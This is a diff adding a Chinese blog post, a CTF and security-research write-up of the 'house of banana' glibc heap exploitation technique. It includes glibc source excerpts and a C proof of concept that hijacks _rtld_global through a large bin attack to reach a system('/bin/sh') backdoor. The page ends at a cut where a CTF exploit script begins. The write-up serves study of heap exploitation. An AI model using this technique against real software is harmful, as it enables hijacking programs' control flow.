@@ -1,0 +1,522 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/ha1vk/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/ha1vk/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/ha1vk/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/ha1vk/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/ha1vk/css/main.css">
+
+
+<link rel="stylesheet" href="/ha1vk/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"github.com","root":"/ha1vk/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+  </script>
+
+  <meta name="description" content="文章首发于安全KER https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;222948 0x01 前言总结出的一种新型堆利用手法，适用于目前所有的glibc版本，我暂且命名它为house of banana~。 0x02 新版glibc的改进从glibc 2.28开始，_int_malloc中增加了对unsorted bin的bk的校验，使得unsorted bin attack变得">
+<meta property="og:type" content="article">
+<meta property="og:title" content="house_of_banana">
+<meta property="og:url" content="https://github.com/ha1vk/2020/12/07/house-of-banana/index.html">
+<meta property="og:site_name" content="ha1vk&#39;s blog">
+<meta property="og:description" content="文章首发于安全KER https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;222948 0x01 前言总结出的一种新型堆利用手法，适用于目前所有的glibc版本，我暂且命名它为house of banana~。 0x02 新版glibc的改进从glibc 2.28开始，_int_malloc中增加了对unsorted bin的bk的校验，使得unsorted bin attack变得">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://p3.ssl.qhimg.com/t011197cbed4f5d1848.png">
+<meta property="og:image" content="https://p0.ssl.qhimg.com/t01b23a2bb2487c3f57.png">
+<meta property="og:image" content="https://p2.ssl.qhimg.com/t014a1a2df2f9476720.png">
+<meta property="og:image" content="https://p0.ssl.qhimg.com/t017312b35952d01ad7.png">
+<meta property="og:image" content="https://p1.ssl.qhimg.com/t012462ff5820e0e81b.png">
+<meta property="og:image" content="https://p2.ssl.qhimg.com/t018e401caf62becc99.png">
+<meta property="og:image" content="https://p1.ssl.qhimg.com/t01ca6662bef51ba8ce.png">
+<meta property="og:image" content="https://p3.ssl.qhimg.com/t0148e4689737e19c67.png">
+<meta property="article:published_time" content="2020-12-07T02:30:15.000Z">
+<meta property="article:modified_time" content="2025-06-26T09:06:40.765Z">
+<meta property="article:author" content="ha1vk">
+<meta property="article:tag" content="堆风水">
+<meta property="article:tag" content="linkmap">
+<meta property="article:tag" content="house of banana">
+<meta property="article:tag" content="glibc &gt;&#x3D; 2.28">
+<meta property="article:tag" content="large bin attack">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://p3.ssl.qhimg.com/t011197cbed4f5d1848.png">
+
+<link rel="canonical" href="https://github.com/ha1vk/2020/12/07/house-of-banana/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>house_of_banana | ha1vk's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/ha1vk/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">ha1vk's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/ha1vk/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/ha1vk/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/ha1vk/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/ha1vk/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/ha1vk/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/ha1vk/2020/12/07/house-of-banana/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/ha1vk/images/avatar.gif">
+      <meta itemprop="name" content="ha1vk">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ha1vk's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          house_of_banana
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-12-07 10:30:15" itemprop="dateCreated datePublished" datetime="2020-12-07T10:30:15+08:00">2020-12-07</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-06-26 17:06:40" itemprop="dateModified" datetime="2025-06-26T17:06:40+08:00">2025-06-26</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/ha1vk/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/ha1vk/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/" itemprop="url" rel="index"><span itemprop="name">安全研究</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>文章首发于安全KER <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/222948">https://www.anquanke.com/post/id/222948</a></p>
+<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>总结出的一种新型堆利用手法，适用于目前所有的glibc版本，我暂且命名它为house of banana~。</p>
+<h2 id="0x02-新版glibc的改进"><a href="#0x02-新版glibc的改进" class="headerlink" title="0x02 新版glibc的改进"></a>0x02 新版glibc的改进</h2><p>从glibc 2.28开始，_int_malloc中增加了对unsorted bin的bk的校验，使得unsorted bin attack变得不可行。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/* remove from unsorted list */</span><br><span class="line">if (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">  malloc_printerr (&quot;malloc(): corrupted unsorted chunks 3&quot;);</span><br></pre></td></tr></table></figure>
+<p>此时，我们可以考虑使用large bin attack，使用house of strom实现任意地址分配；然而，从glibc2.29开始，检查变得更加严格，house of strom不能用了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">if (__glibc_unlikely (size &lt;= 2 * SIZE_SZ)</span><br><span class="line">    || __glibc_unlikely (size &gt; av-&gt;system_mem))</span><br><span class="line">  malloc_printerr (&quot;malloc(): invalid size (unsorted)&quot;);</span><br><span class="line">if (__glibc_unlikely (chunksize_nomask (next) &lt; 2 * SIZE_SZ)</span><br><span class="line">    || __glibc_unlikely (chunksize_nomask (next) &gt; av-&gt;system_mem))</span><br><span class="line">  malloc_printerr (&quot;malloc(): invalid next size (unsorted)&quot;);</span><br><span class="line">if (__glibc_unlikely ((prev_size (next) &amp; ~(SIZE_BITS)) != size))</span><br><span class="line">  malloc_printerr (&quot;malloc(): mismatching next-&gt;prev_size (unsorted)&quot;);</span><br><span class="line">if (__glibc_unlikely (bck-&gt;fd != victim)</span><br><span class="line">    || __glibc_unlikely (victim-&gt;fd != unsorted_chunks (av)))</span><br><span class="line">  malloc_printerr (&quot;malloc(): unsorted double linked list corrupted&quot;);</span><br><span class="line">if (__glibc_unlikely (prev_inuse (next)))</span><br><span class="line">  malloc_printerr (&quot;malloc(): invalid next-&gt;prev_inuse (unsorted)&quot;);</span><br></pre></td></tr></table></figure>
+<p>但是幸运的是large bin attack仍然可以使用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">if ((unsigned long) size</span><br><span class="line"> == (unsigned long) chunksize_nomask (fwd))</span><br><span class="line">                    /* Always insert in the second position.  */</span><br><span class="line">                    fwd = fwd-&gt;fd;</span><br><span class="line">                  else</span><br><span class="line">                    &#123;</span><br><span class="line">                      victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                      victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                      fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                      victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                    &#125;</span><br><span class="line">                  bck = fwd-&gt;bk;</span><br></pre></td></tr></table></figure>
+<p>然而从glibc 2.30开始，常规large bin attack方法也被封堵</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">if ((unsigned long) size</span><br><span class="line">	  == (unsigned long) chunksize_nomask (fwd))</span><br><span class="line">                      /* Always insert in the second position.  */</span><br><span class="line">                      fwd = fwd-&gt;fd;</span><br><span class="line">                    else</span><br><span class="line">                      &#123;</span><br><span class="line">                        victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                        victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                        if (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><br><span class="line">                          malloc_printerr (&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;);</span><br><span class="line">                        fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                        victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                      &#125;</span><br><span class="line">                    bck = fwd-&gt;bk;</span><br><span class="line">                    if (bck-&gt;fd != fwd)</span><br><span class="line">                      malloc_printerr (&quot;malloc(): largebin double linked list corrupted (bk)&quot;);</span><br></pre></td></tr></table></figure>
+<h2 id="0x03-large-bin-attack在新版glibc中的利用"><a href="#0x03-large-bin-attack在新版glibc中的利用" class="headerlink" title="0x03 large bin attack在新版glibc中的利用"></a>0x03 large bin attack在新版glibc中的利用</h2><p>那是否意味着large bin attack不能用了呢，其实不是，以前的large bin attack手法，都是在下面第二个分支里进行<br><img src="https://p3.ssl.qhimg.com/t011197cbed4f5d1848.png"><br>在最新版的glibc 2.32里，我们看到，第二个分支里确实封堵了以前的利用手法，但是在第一个分支里，仍然可以实现large bin attack，但是该分支利用起来，只是完成<strong>往任意地址写一个堆地址</strong>的作用，因为这里的<code>bck-&gt;bk</code>才是我们的large bin，因此分析来看，我们能够控制的也就是图中第一个分支中的<code>fwd-&gt;fd-&gt;bk_nextsize</code>，而完成写的操作是在<code>fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</code> 这句中，即可以往任意地址写上这个unsorted bin chunk堆的地址。而以前旧版large bin attack是可以往<strong>任意的两个地址写两个堆地址</strong>。</p>
+<h2 id="0x04-house-of-banana"><a href="#0x04-house-of-banana" class="headerlink" title="0x04 house of banana"></a>0x04 house of banana</h2><h3 id="适用场景（满足任一条件即可）："><a href="#适用场景（满足任一条件即可）：" class="headerlink" title="适用场景（满足任一条件即可）："></a>适用场景（满足任一条件即可）：</h3><h4 id="1-程序能够显式的执行exit函数"><a href="#1-程序能够显式的执行exit函数" class="headerlink" title="1.程序能够显式的执行exit函数"></a>1.程序能够显式的执行exit函数</h4><h4 id="2-程序通过libc-start-main启动的主函数，且主函数能够结束"><a href="#2-程序通过libc-start-main启动的主函数，且主函数能够结束" class="headerlink" title="2.程序通过libc_start_main启动的主函数，且主函数能够结束"></a>2.程序通过libc_start_main启动的主函数，且主函数能够结束</h4><h3 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h3><p>在ld.so里，存在一个_rtld_global指针，指向rtld_global结构体<br><img src="https://p0.ssl.qhimg.com/t01b23a2bb2487c3f57.png"><br>该结构体较为复杂</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">struct rtld_global</span><br><span class="line">&#123;</span><br><span class="line">#endif</span><br><span class="line">  /* Don&#x27;t change the order of the following elements.  &#x27;dl_loaded&#x27;</span><br><span class="line">     must remain the first element.  Forever.  */</span><br><span class="line"></span><br><span class="line">/* Non-shared code has no support for multiple namespaces.  */</span><br><span class="line">#ifdef SHARED</span><br><span class="line"># define DL_NNS 16</span><br><span class="line">#else</span><br><span class="line"># define DL_NNS 1</span><br><span class="line">#endif</span><br><span class="line">  EXTERN struct link_namespaces</span><br><span class="line">  &#123;</span><br><span class="line">    /* A pointer to the map for the main map.  */</span><br><span class="line">    struct link_map *_ns_loaded;</span><br><span class="line">    /* Number of object in the _dl_loaded list.  */</span><br><span class="line">    unsigned int _ns_nloaded;</span><br><span class="line">    /* Direct pointer to the searchlist of the main object.  */</span><br><span class="line">    struct r_scope_elem *_ns_main_searchlist;</span><br><span class="line">    /* This is zero at program start to signal that the global scope map is</span><br><span class="line">       allocated by rtld.  Later it keeps the size of the map.  It might be</span><br><span class="line">       reset if in _dl_close if the last global object is removed.  */</span><br><span class="line">    unsigned int _ns_global_scope_alloc;</span><br><span class="line"></span><br><span class="line">    /* During dlopen, this is the number of objects that still need to</span><br><span class="line">       be added to the global scope map.  It has to be taken into</span><br><span class="line">       account when resizing the map, for future map additions after</span><br><span class="line">       recursive dlopen calls from ELF constructors.  */</span><br><span class="line">    unsigned int _ns_global_scope_pending_adds;</span><br><span class="line"></span><br><span class="line">    /* Once libc.so has been loaded into the namespace, this points to</span><br><span class="line">       its link map.  */</span><br><span class="line">    struct link_map *libc_map;</span><br><span class="line"></span><br><span class="line">    /* Search table for unique objects.  */</span><br><span class="line">    struct unique_sym_table</span><br><span class="line">    &#123;</span><br><span class="line">      __rtld_lock_define_recursive (, lock)</span><br><span class="line">      struct unique_sym</span><br><span class="line">      &#123;</span><br><span class="line">	uint32_t hashval;</span><br><span class="line">	const char *name;</span><br><span class="line">	const ElfW(Sym) *sym;</span><br><span class="line">	const struct link_map *map;</span><br><span class="line">      &#125; *entries;</span><br><span class="line">      size_t size;</span><br><span class="line">      size_t n_elements;</span><br><span class="line">      void (*free) (void *);</span><br><span class="line">    &#125; _ns_unique_sym_table;</span><br><span class="line">    /* Keep track of changes to each namespace&#x27; list.  */</span><br><span class="line">    struct r_debug _ns_debug;</span><br><span class="line">  &#125; _dl_ns[DL_NNS];</span><br><span class="line">  /* One higher than index of last used namespace.  */</span><br><span class="line">  EXTERN size_t _dl_nns;</span><br><span class="line">.................................................................................</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>其中我们看到里面有多个<code>_dl_ns</code>结构体，调试发现，该结构体存储着的实际就是elf各段的符号结构体<br><img src="https://p2.ssl.qhimg.com/t014a1a2df2f9476720.png"><br>，类似于IDA中的段结构体<br><img src="https://p0.ssl.qhimg.com/t017312b35952d01ad7.png"><br>我们较为关注的是fini_array段的动态链接结构体指针<br><img src="https://p1.ssl.qhimg.com/t012462ff5820e0e81b.png"><br>该结构体实际在在_dl_fini中被使用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">     if (l-&gt;l_info[DT_FINI_ARRAY] != NULL)</span><br><span class="line">&#123;</span><br><span class="line">  ElfW(Addr) *array =</span><br><span class="line">    (ElfW(Addr) *) (l-&gt;l_addr</span><br><span class="line">		    + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</span><br><span class="line">  unsigned int i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</span><br><span class="line">		    / sizeof (ElfW(Addr)));</span><br><span class="line">  while (i-- &gt; 0)</span><br><span class="line">    ((fini_t) array[i]) ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>汇编中对应的代码如下<br><img src="https://p2.ssl.qhimg.com/t018e401caf62becc99.png"><br>因此，伪造该结构体指针，可以使得array指向我们可控的数据区，从而布置下一系列函数，进而劫持程序的流，那么house of banana的思想就是利用large bin attack往rtld_global写入堆的地址，并事先在堆里伪造好rtld_global结构体，这样程序exit或者正常退出main函数时，便会执行到伪造的fini_array数组。</p>
+<h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><p>poc需要根据环境需要修改偏移，在有些情况下，rtld_global_ptr与libc_base的偏移在本地与远程并不是固定的，可能会在地址的第2字节处发生变化，因此可以爆破256种可能得到远程环境的精确偏移。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">void backdoor() &#123;</span><br><span class="line">   puts(&quot;you hacked me!!&quot;);</span><br><span class="line">   system(&quot;/bin/sh&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">   puts(&quot;house of banana&#x27;s poc&quot;);</span><br><span class="line">   size_t libc_base = &amp;puts - 0x87490;</span><br><span class="line">   size_t _rtld_global_ptr_addr = libc_base + 0x227060;</span><br><span class="line">   char *ptr0 = malloc(0x450);</span><br><span class="line">   char *gap = malloc(0x10);</span><br><span class="line">   char *ptr1 = malloc(0x440);</span><br><span class="line">   gap = malloc(0x10);</span><br><span class="line">   char *ptr2 = malloc(0x410);</span><br><span class="line">   gap = malloc(0x10);</span><br><span class="line"></span><br><span class="line">   free(ptr0);</span><br><span class="line">   //put ptr9 into large bin</span><br><span class="line">   malloc(0x500);</span><br><span class="line">   free(ptr1); //free ptr1 into unsorted bin</span><br><span class="line">   free(ptr2); //free ptr2 into unsorted bin</span><br><span class="line">   //bk_nextsize = _rtld_global_ptr_addr</span><br><span class="line">   *(size_t *)(ptr0 + 0x18) = _rtld_global_ptr_addr - 0x20;</span><br><span class="line">   malloc(0x410); //large bin attack to  hijack _rtld_global_ptr</span><br><span class="line"></span><br><span class="line">   //fake a _rtld_global</span><br><span class="line">   size_t fake_rtld_global_addr = ptr1 - 0x10;</span><br><span class="line">   size_t *fake_rtld_global = (size_t *)ptr1;</span><br><span class="line">   char buf[0x100];</span><br><span class="line">   //the chain&#x27;s length must &gt;= 4</span><br><span class="line">   fake_rtld_global[1] = &amp;fake_rtld_global[2];</span><br><span class="line">   fake_rtld_global[3] = fake_rtld_global_addr;</span><br><span class="line"></span><br><span class="line">   fake_rtld_global[2+3] = &amp;fake_rtld_global[3];</span><br><span class="line">   fake_rtld_global[2+5] = &amp;fake_rtld_global[2];</span><br><span class="line"></span><br><span class="line">   fake_rtld_global[3+3] = &amp;fake_rtld_global[8];</span><br><span class="line">   fake_rtld_global[3+5] = &amp;fake_rtld_global[3];</span><br><span class="line"></span><br><span class="line">   fake_rtld_global[8+3] = 0;</span><br><span class="line">   fake_rtld_global[8+5] = &amp;fake_rtld_global[8];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   //fake a fini_array segment</span><br><span class="line">   fake_rtld_global[0x20] = &amp;fake_rtld_global[0x30];</span><br><span class="line">   fake_rtld_global[0x22] = &amp;fake_rtld_global[0x23];</span><br><span class="line">   fake_rtld_global[0x23+1] = 0x8; //func ptrs total len</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   fake_rtld_global[0x30] = 0x1A;</span><br><span class="line">   fake_rtld_global[0x31] = 0;</span><br><span class="line">   fake_rtld_global[-2] = &amp;fake_rtld_global[0x32];</span><br><span class="line"></span><br><span class="line">   //funcs</span><br><span class="line">   fake_rtld_global[0x32] = backdoor;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   fake_rtld_global[0x61] = 0x800000000;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="0x05-实例应用"><a href="#0x05-实例应用" class="headerlink" title="0x05 实例应用"></a>0x05 实例应用</h2><h3 id="西湖论剑2020决赛-husk"><a href="#西湖论剑2020决赛-husk" class="headerlink" title="西湖论剑2020决赛 husk"></a>西湖论剑2020决赛 husk</h3><p>add函数中的size的范围为large bin范围<br><img src="https://p1.ssl.qhimg.com/t01ca6662bef51ba8ce.png"><br>delete功能里未清空指针，存在UAF<br><img src="https://p3.ssl.qhimg.com/t0148e4689737e19c67.png"><br>程序有edit和show功能，glibc版本为2.30，由于程序基址无法知道，不能用unlink的方法，因此，可以使用house of banana</p>
+<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span 